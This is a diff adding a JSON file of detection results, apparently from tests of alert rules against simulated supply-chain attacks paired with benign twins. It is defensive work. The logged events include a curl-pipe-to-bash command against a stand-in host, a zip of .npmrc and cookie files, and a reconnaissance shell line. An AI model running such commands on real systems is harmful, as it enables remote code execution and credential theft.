@@ -1,0 +1,52 @@
+{
+ "axios/attack": {},
+ "axios/twin": {},
+ "contagious-interview/attack": {},
+ "contagious-interview/twin": {
+  "Uncommon DNS Request via Bun or Node.js": {
+   "kind": "new terms, low",
+   "count": 1,
+   "first": "nodejs.org"
+  }
+ },
+ "contagious-interview-task/attack": {
+  "Suspicious Command Execution from Visual Studio Code": {
+   "kind": "ES|QL, medium",
+   "count": 1,
+   "first": "/bin/zsh -l -c curl 'https://vscode-config.acme-deploy.example/settings/mac?flag=8' | bash"
+  }
+ },
+ "contagious-interview-task/twin": {
+  "Uncommon DNS Request via Bun or Node.js": {
+   "kind": "new terms, low",
+   "count": 1,
+   "first": "nodejs.org"
+  }
+ },
+ "cursor-extension/attack": {},
+ "cursor-extension/twin": {},
+ "glassworm/attack": {
+  "Multiple Credential Access by VS Code or Cursor IDE Descendant": {
+   "kind": "ES|QL, high",
+   "count": 1,
+   "first": "zip -qr /tmp/qvkda.zip /tmp/qvkda: ['.npmrc', 'cookies', 'cookies.sqlite']"
+  }
+ },
+ "glassworm/twin": {},
+ "litellm/attack": {
+  "First Time Python Spawned a Shell on Host": {
+   "kind": "new terms, medium",
+   "count": 2,
+   "first": "/bin/sh -c hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null"
+  }
+ },
+ "litellm/twin": {},
+ "shai-hulud/attack": {
+  "Uncommon DNS Request via Bun or Node.js": {
+   "kind": "new terms, low",
+   "count": 4,
+   "first": "api.github.com"
+  }
+ },
+ "shai-hulud/twin": {}
+}
